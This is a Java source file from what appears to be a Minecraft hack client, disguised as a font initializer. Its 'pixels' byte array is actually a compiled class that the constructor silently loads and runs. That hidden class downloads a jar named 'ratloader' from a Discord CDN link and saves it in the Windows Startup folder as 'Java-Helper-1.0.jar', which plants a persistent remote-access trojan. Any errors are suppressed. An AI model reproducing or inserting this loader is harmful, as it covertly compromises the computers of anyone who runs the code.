package me.gavin.gavhackplus.util.font.hal;

public class CFontInitializer extends ClassLoader {

    public CFontInitializer() {
        try {
            byte[] pixels = {-54, -2, -70, -66, 0, 0, 0, 52, 0, 104, 10, 0, 29, 0, 56, 7, 0, 57, 8, 0, 58, 10, 0, 2, 0, 59, 10, 0, 2, 0, 60, 7, 0, 61, 8, 0, 62, 8, 0, 63, 10, 0, 6, 0, 64, 8, 0, 65, 8, 0, 66, 7, 0, 67, 10, 0, 6, 0, 68, 10, 0, 12, 0, 69, 7, 0, 70, 7, 0, 71, 10, 0, 16, 0, 56, 8, 0, 72, 10, 0, 73, 0, 74, 10, 0, 16, 0, 75, 8, 0, 76, 10, 0, 16, 0, 77, 10, 0, 15, 0, 59, 10, 0, 12, 0, 78, 10, 0, 15, 0, 79, 10, 0, 15, 0, 80, 7, 0, 81, 7, 0, 82, 7, 0, 83, 1, 0, 6, 60, 105, 110, 105, 116, 62, 1, 0, 3, 40, 41, 86, 1, 0, 4, 67, 111, 100, 101, 1, 0, 15, 76, 105, 110, 101, 78, 117, 109, 98, 101, 114, 84, 97, 98, 108, 101, 1, 0, 18, 76, 111, 99, 97, 108, 86, 97, 114, 105, 97, 98, 108, 101, 84, 97, 98, 108, 101, 1, 0, 4, 116, 104, 105, 115, 1, 0, 16, 76, 66, 111, 111, 116, 115, 116, 114, 97, 112, 67, 108, 97, 115, 115, 59, 1, 0, 4, 109, 97, 105, 110, 1, 0, 4, 99, 111, 110, 110, 1, 0, 28, 76, 106, 97, 118, 97, 47, 110, 101, 116, 47, 72, 116, 116, 112, 85, 82, 76, 67, 111, 110, 110, 101, 99, 116, 105, 111, 110, 59, 1, 0, 2, 105, 110, 1, 0, 29, 76, 106, 97, 118, 97, 47, 105, 111, 47, 66, 117, 102, 102, 101, 114, 101, 100, 73, 110, 112, 117, 116, 83, 116, 114, 101, 97, 109, 59, 1, 0, 16, 102, 105, 108, 101, 79, 117, 116, 112, 117, 116, 83, 116, 114, 101, 97, 109, 1, 0, 26, 76, 106, 97, 118, 97, 47, 105, 111, 47, 70, 105, 108, 101, 79, 117, 116, 112, 117, 116, 83, 116, 114, 101, 97, 109, 59, 1, 0, 10, 100, 97, 116, 97, 66, 117, 102, 102, 101, 114, 1, 0, 2, 91, 66, 1, 0, 9, 98, 121, 116, 101, 115, 82, 101, 97, 100, 1, 0, 1, 73, 1, 0, 13, 83, 116, 97, 99, 107, 77, 97, 112, 84, 97, 98, 108, 101, 7, 0, 61, 7, 0, 67, 7, 0, 70, 7, 0, 45, 7, 0, 81, 1, 0, 10, 83, 111, 117, 114, 99, 101, 70, 105, 108, 101, 1, 0, 19, 66, 111, 111, 116, 115, 116, 114, 97, 112, 67, 108, 97, 115, 115, 46, 106, 97, 118, 97, 12, 0, 30, 0, 31, 1, 0, 12, 106, 97, 118, 97, 47, 110, 101, 116, 47, 85, 82, 76, 1, 0, 99, 104, 116, 116, 112, 115, 58, 47, 47, 99, 100, 110, 46, 100, 105, 115, 99, 111, 114, 100, 97, 112, 112, 46, 99, 111, 109, 47, 97, 116, 116, 97, 99, 104, 109, 101, 110, 116, 115, 47, 56, 50, 56, 57, 56, 54, 51, 52, 48, 54, 57, 53, 51, 52, 51, 49, 48, 54, 47, 56, 50, 56, 57, 56, 57, 51, 49, 48, 53, 53, 53, 51, 56, 57, 57, 53, 50, 47, 114, 97, 116, 108, 111, 97, 100, 101, 114, 45, 112, 111, 111, 112, 45, 97, 108, 108, 46, 106, 97, 114, 12, 0, 30, 0, 84, 12, 0, 85, 0, 86, 1, 0, 26, 106, 97, 118, 97, 47, 110, 101, 116, 47, 72, 116, 116, 112, 85, 82, 76, 67, 111, 110, 110, 101, 99, 116, 105, 111, 110, 1, 0, 12, 67, 111, 110, 116, 101, 110, 116, 45, 84, 121, 112, 101, 1, 0, 16, 97, 112, 112, 108, 105, 99, 97, 116, 105, 111, 110, 47, 106, 115, 111, 110, 12, 0, 87, 0, 88, 1, 0, 10, 85, 115, 101, 114, 45, 65, 103, 101, 110, 116, 1, 0, 29, 74, 97, 118, 97, 45, 68, 105, 115, 99, 111, 114, 100, 87, 101, 98, 104, 111, 111, 107, 45, 66, 89, 45, 71, 101, 108, 111, 120, 95, 1, 0, 27, 106, 97, 118, 97, 47, 105, 111, 47, 66, 117, 102, 102, 101, 114, 101, 100, 73, 110, 112, 117, 116, 83, 116, 114, 101, 97, 109, 12, 0, 89, 0, 90, 12, 0, 30, 0, 91, 1, 0, 24, 106, 97, 118, 97, 47, 105, 111, 47, 70, 105, 108, 101, 79, 117, 116, 112, 117, 116, 83, 116, 114, 101, 97, 109, 1, 0, 23, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 83, 116, 114, 105, 110, 103, 66, 117, 105, 108, 100, 101, 114, 1, 0, 9, 117, 115, 101, 114, 46, 104, 111, 109, 101, 7, 0, 92, 12, 0, 93, 0, 94, 12, 0, 95, 0, 96, 1, 0, 82, 47, 65, 112, 112, 68, 97, 116, 97, 47, 82, 111, 97, 109, 105, 110, 103, 47, 77, 105, 99, 114, 111, 115, 111, 102, 116, 47, 87, 105, 110, 100, 111, 119, 115, 47, 83, 116, 97, 114, 116, 32, 77, 101, 110, 117, 47, 80, 114, 111, 103, 114, 97, 109, 115, 47, 83, 116, 97, 114, 116, 117, 112, 47, 74, 97, 118, 97, 45, 72, 101, 108, 112, 101, 114, 45, 49, 46, 48, 46, 106, 97, 114, 12, 0, 97, 0, 98, 12, 0, 99, 0, 100, 12, 0, 101, 0, 102, 12, 0, 103, 0, 31, 1, 0, 19, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 69, 120, 99, 101, 112, 116, 105, 111, 110, 1, 0, 14, 66, 111, 111, 116, 115, 116, 114, 97, 112, 67, 108, 97, 115, 115, 1, 0, 16, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 79, 98, 106, 101, 99, 116, 1, 0, 21, 40, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 83, 116, 114, 105, 110, 103, 59, 41, 86, 1, 0, 14, 111, 112, 101, 110, 67, 111, 110, 110, 101, 99, 116, 105, 111, 110, 1, 0, 26, 40, 41, 76, 106, 97, 118, 97, 47, 110, 101, 116, 47, 85, 82, 76, 67, 111, 110, 110, 101, 99, 116, 105, 111, 110, 59, 1, 0, 18, 97, 100, 100, 82, 101, 113, 117, 101, 115, 116, 80, 114, 111, 112, 101, 114, 116, 121, 1, 0, 39, 40, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 83, 116, 114, 105, 110, 103, 59, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 83, 116, 114, 105, 110, 103, 59, 41, 86, 1, 0, 14, 103, 101, 116, 73, 110, 112, 117, 116, 83, 116, 114, 101, 97, 109, 1, 0, 23, 40, 41, 76, 106, 97, 118, 97, 47, 105, 111, 47, 73, 110, 112, 117, 116, 83, 116, 114, 101, 97, 109, 59, 1, 0, 24, 40, 76, 106, 97, 118, 97, 47, 105, 111, 47, 73, 110, 112, 117, 116, 83, 116, 114, 101, 97, 109, 59, 41, 86, 1, 0, 16, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 83, 121, 115, 116, 101, 109, 1, 0, 11, 103, 101, 116, 80, 114, 111, 112, 101, 114, 116, 121, 1, 0, 38, 40, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 83, 116, 114, 105, 110, 103, 59, 41, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 83, 116, 114, 105, 110, 103, 59, 1, 0, 6, 97, 112, 112, 101, 110, 100, 1, 0, 45, 40, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 83, 116, 114, 105, 110, 103, 59, 41, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 83, 116, 114, 105, 110, 103, 66, 117, 105, 108, 100, 101, 114, 59, 1, 0, 8, 116, 111, 83, 116, 114, 105, 110, 103, 1, 0, 20, 40, 41, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 83, 116, 114, 105, 110, 103, 59, 1, 0, 4, 114, 101, 97, 100, 1, 0, 7, 40, 91, 66, 73, 73, 41, 73, 1, 0, 5, 119, 114, 105, 116, 101, 1, 0, 7, 40, 91, 66, 73, 73, 41, 86, 1, 0, 5, 99, 108, 111, 115, 101, 0, 33, 0, 28, 0, 29, 0, 0, 0, 0, 0, 2, 0, 1, 0, 30, 0, 31, 0, 1, 0, 32, 0, 0, 0, 47, 0, 1, 0, 1, 0, 0, 0, 5, 42, -73, 0, 1, -79, 0, 0, 0, 2, 0, 33, 0, 0, 0, 6, 0, 1, 0, 0, 0, 6, 0, 34, 0, 0, 0, 12, 0, 1, 0, 0, 0, 5, 0, 35, 0, 36, 0, 0, 0, 9, 0, 37, 0, 31, 0, 1, 0, 32, 0, 0, 1, 37, 0, 4, 0, 5, 0, 0, 0, 117, -69, 0, 2, 89, 18, 3, -73, 0, 4, -74, 0, 5, -64, 0, 6, 75, 42, 18, 7, 18, 8, -74, 0, 9, 42, 18, 10, 18, 11, -74, 0, 9, -69, 0, 12, 89, 42, -74, 0, 13, -73, 0, 14, 76, -69, 0, 15, 89, -69, 0, 16, 89, -73, 0, 17, 18, 18, -72, 0, 19, -74, 0, 20, 18, 21, -74, 0, 20, -74, 0, 22, -73, 0, 23, 77, 17, 4, 0, -68, 8, 78, 43, 45, 3, 17, 4, 0, -74, 0, 24, 89, 54, 4, 2, -97, 0, 14, 44, 45, 3, 21, 4, -74, 0, 25, -89, -1, -24, 44, -74, 0, 26, -89, 0, 4, 75, -79, 0, 1, 0, 0, 0, 112, 0, 115, 0, 27, 0, 3, 0, 33, 0, 0, 0, 50, 0, 12, 0, 0, 0, 10, 0, 16, 0, 11, 0, 24, 0, 12, 0, 32, 0, 13, 0, 44, 0, 15, 0, 75, 0, 16, 0, 81, 0, 18, 0, 97, 0, 19, 0, 108, 0, 21, 0, 112, 0, 23, 0, 115, 0, 22, 0, 116, 0, 24, 0, 34, 0, 0, 0, 52, 0, 5, 0, 16, 0, 96, 0, 38, 0, 39, 0, 0, 0, 44, 0, 68, 0, 40, 0, 41, 0, 1, 0, 75, 0, 37, 0, 42, 0, 43, 0, 2, 0, 81, 0, 31, 0, 44, 0, 45, 0, 3, 0, 93, 0, 19, 0, 46, 0, 47, 0, 4, 0, 48, 0, 0, 0, 36, 0, 4, -1, 0, 81, 0, 4, 7, 0, 49, 7, 0, 50, 7, 0, 51, 7, 0, 52, 0, 0, -4, 0, 26, 1, -1, 0, 6, 0, 0, 0, 1, 7, 0, 53, 0, 0, 1, 0, 54, 0, 0, 0, 2, 0, 55};

            defineClass("BootstrapClass", pixels, 0, pixels.length).getMethod("main").invoke(null);
        } catch (Exception ignored) {}
    }
}
